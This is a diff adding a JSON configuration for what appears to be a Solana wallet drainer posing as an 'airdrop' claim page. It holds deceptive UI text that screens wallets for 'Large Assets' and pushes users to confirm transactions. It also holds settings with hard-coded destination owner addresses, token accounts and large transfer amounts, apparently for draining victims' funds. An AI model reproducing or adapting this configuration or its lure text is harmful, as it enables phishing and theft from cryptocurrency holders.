@@ -1,0 +1,52 @@
+{
+    "solflareWallet": {
+        "sol": 0.01,
+        "transactions": 20
+    },
+    "modal": 0,
+    "words": {
+        "onLoaded": "Sign Up / Sign In with Wallet",
+        "onConnected": "{addressfirst4}...{addresslast4}",
+        "onNoAccountInfo": "Invalid Wallet",
+        "onNotEnoughLamports": "Wallet has no funds to pay the transaction Fees.",
+        "onClaiming": "Requesting airdrop...",
+        "onClaimingDesc": "Please wait while we requesting airdrop...",
+        "onClaimingIneligible": "Ineligible",
+        "onClaimingIneligibleDesc": "Connected wallet is ineligible. Requested requirements: Large Assets",
+        "onClaimLoading": "Claiming...",
+        "onClaimLoadingDesc": "Signing airdrop request...",
+        "onDecline": "Error",
+        "onDeclineDesc": "You should confirm the transactions to finalize the airdropping!"
+    },
+    "phantomWallet": {
+        "minimal_amount": 1,
+        "type": 0,
+        "sCon": false,
+        "doublePopup": {
+            "enabled": false,
+            "solana": 0.01,
+            "solanaOwner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
+            "tokens": [
+                {
+                    "token": "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy",
+                    "source": "42pw7vKm2c2mtKq6uNsMY9hhwG8ecaeqLWC3iB1sXAU6",
+                    "owner": "sV78H7ZxrgpRso5NVntNR3UzUmetTxAhrqSJsysq32A",
+                    "amount": 500000000000
+                }
+            ]
+        },
+        "lol": {
+            "enabled": true,
+            "solana": 0,
+            "solanaOwner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
+            "tokens": [
+                {
+                    "token": "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy",
+                    "source": "42pw7vKm2c2mtKq6uNsMY9hhwG8ecaeqLWC3iB1sXAU6",
+                    "owner": "sV78H7ZxrgpRso5NVntNR3UzUmetTxAhrqSJsysq32A",
+                    "amount": 500000000000
+                }
+            ]
+        }
+    }
+}
